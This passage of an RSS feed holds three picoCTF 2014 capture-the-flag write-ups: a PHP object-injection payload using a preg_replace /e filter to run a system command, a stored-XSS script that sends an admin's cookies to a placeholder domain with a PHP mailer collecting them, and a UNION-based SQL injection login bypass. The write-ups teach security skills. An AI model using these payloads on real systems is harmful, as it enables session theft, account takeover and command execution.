<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-object-injection">The Object Injection<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#the-object-injection" class="hash-link" aria-label="Direct link to The Object Injection" title="Direct link to The Object Injection">​</a></h2>
<p>There are several important items to notice while reading the source of the website.</p>
<ol>
<li>Whatever is in the <code>custom_settings</code> cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.</li>
<li>In the <code>classes.php</code> file, the Post’s <code>__destruct()</code> method is redefined. It now is intended to output the Post’s fields in comments, as “debugging stuff.”</li>
<li>The Filter class used by the Post’s <code>__destruct()</code> method uses the <code>preg_replace()</code> method with class fields as arguments.</li>
</ol>
<p>These three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the <code>custom_settings</code> cookie.</p>
<p>The necessary object to cat the flag from <code>/home/daedalus/flag.txt</code> will look something like this in PHP:</p>
<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$filter_set = [</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		new Filter('/.*/e', 'system("cat /home/daedalus/flag.txt")')</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	];</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$obj = serialize(true) . "\n" . serialize(new Post(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	"the flag is",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	"fail",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	$filter_set));</span><br></span></code></pre></div></div>
<p>The Filter uses the “e” flag on the <code>preg_replace()</code> call. This will run the replacement argument as PHP code and replace the matching text with the output.</p>
<p>By having out only filter match everything, and run the command <code>$ cat /home/daedalus/flag.txt</code>, we will replace the body of the Post we inject with the flag.</p>
<p>Outputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of <code>custom_settings_hash</code>. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.</p>
<p>Finally, by replacing <code>custom_settings</code> with a urlencoding of the serialized object, and <code>custom_settings_hash</code> with the new signature, we will see the flag in the comments of the site:</p>
<p>D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve</p>
<hr>
<p>Note: the payload for <code>custom_settings</code> will look something like:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">b%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D</span><br></span></code></pre></div></div>
<p>However, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[picoCTF 2014 part 2: secure_page_service]]></title>
            <link>https://clifford.ressel.fyi/blog/picoctf-2014-part2</link>
            <guid>https://clifford.ressel.fyi/blog/picoctf-2014-part2</guid>
            <pubDate>Sun, 30 Nov 2014 00:00:00 GMT</pubDate>
            <description><![CDATA[Summary]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>This problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin’s cookies should they choose to visit the page. The “Report to Moderator” button says, “Report this page, and a moderator will personally review it in the next few minutes!” so it is a safe assumption that we can have an admin view our injected code.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h2>
<p>The first thing we need is an account on the challenge's site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary.</p>
<p>Examining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (“Spam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!”).</p>
<p>Furthermore, attempting to use HTML tags reveals that the input allows HTML code.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enter-xss">Enter XSS<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#enter-xss" class="hash-link" aria-label="Direct link to Enter XSS" title="Direct link to Enter XSS">​</a></h2>
<p>We can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer’s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page.</p>
<p>Once we have the admin’s cookies, we can change our cookies to theirs to view the locked page.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-setup">The Setup<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#the-setup" class="hash-link" aria-label="Direct link to The Setup" title="Direct link to The Setup">​</a></h2>
<p>First we need the two scripts.</p>
<p>The injected script for the page will be:</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token script language-javascript dom variable" style="color:rgb(189, 147, 249);font-style:italic">location</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token script language-javascript property-access">href</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript string" style="color:rgb(255, 121, 198)">'http://www.YourDomainName.com/cookiestealer.php?cookie='</span><span class="token script language-javascript operator">+</span><span class="token script language-javascript dom variable" style="color:rgb(189, 147, 249);font-style:italic">document</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token script language-javascript property-access">cookie</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre></div></div>
<p>And the php script at the above domain name (cookiestealer.php) will look like:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$cookie = $HTTP_GET_VARS["cookie"]; mail("YourEmail@YouMailProvider.com", "Stolen Cookies", $cookie);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?&gt;</span><br></span></code></pre></div></div>
<p>For free hosting, a number of options are available. We chose to use <a href="http://www.000webhost.com/">000webhost</a>, simply because they have a nice in-browser file manager—no need to mess around with FTP clients.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-forgery">Cookie Forgery<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#cookie-forgery" class="hash-link" aria-label="Direct link to Cookie Forgery" title="Direct link to Cookie Forgery">​</a></h2>
<p>After setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page.</p>
<p>From here, we check our email for the admin cookies. Using a plugin like <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en">this</a> or <a href="https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/">this</a> we can quickly change our cookies to the admin's, allowing us to view the locked page, and thus, the flag:</p>
<p>wow_cross_site_scripting_is_such_web</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[picoCTF 2014 part 1: Injection 2]]></title>
            <link>https://clifford.ressel.fyi/blog/picoctf-2014-part1</link>
            <guid>https://clifford.ressel.fyi/blog/picoctf-2014-part1</guid>
            <pubDate>Sat, 29 Nov 2014 00:00:00 GMT</pubDate>
            <description><![CDATA[Summary]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>By unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program’s requirements.</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- '</span><br></span></code></pre></div></div>
<p>(with “1337” entered as the password)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-program">The Program<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#the-program" class="hash-link" aria-label="Direct link to The Program" title="Direct link to The Program">​</a></h2>
<p>The source is available <a href="http://web2014.picoctf.com/injection2/login.phps">here</a>. Examination of the source shows several things.
First, we can make injections into the username field.
Second, the returned data from the query will need to meet the following requirements to reveal the flag:</p>
<ul>
<li><code>mysqli_num_rows($result) === 1</code> — only one row</li>
<li><code>$row["password"] === $password</code> — row’s password must match our given password</li>
<li><code>$row["user_level"] &gt;= 1337</code> — row’s user_level must be greater than or equal to 1337</li>
</ul>
<p>Finally, by setting the form’s hidden field “debug” to 1, we receive a nice view of our input and the generated query.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-injection">The Injection<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#the-injection" class="hash-link" aria-label="Direct link to The Injection" title="Direct link to The Injection">​</a></h2>
<p>By taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements.</p>
<p>An injection of:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">asdf' UNION SELECT 0 AS a LIMIT 1 -- </span><br></span></code></pre></div></div>
<p>Will yield the query:</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- </span><br></span></code></pre></div></div>
<p>Let’s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.
This gives us the following error:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">SQL error: The used SELECT statements have a different number of columns</span><br></span></code></pre></div></div>
<p>However, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.
New query:</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- </span><br></span></code></pre></div></div>
<p>As we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form.</p>
<p>The final query:</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- '</span><br></span></code></pre></div></div>
<p>This proves successful!
(as the flag appears to be dynamically generated it is not included here)</p>]]></content:encoded>
        </item>
    </channel>
</rss>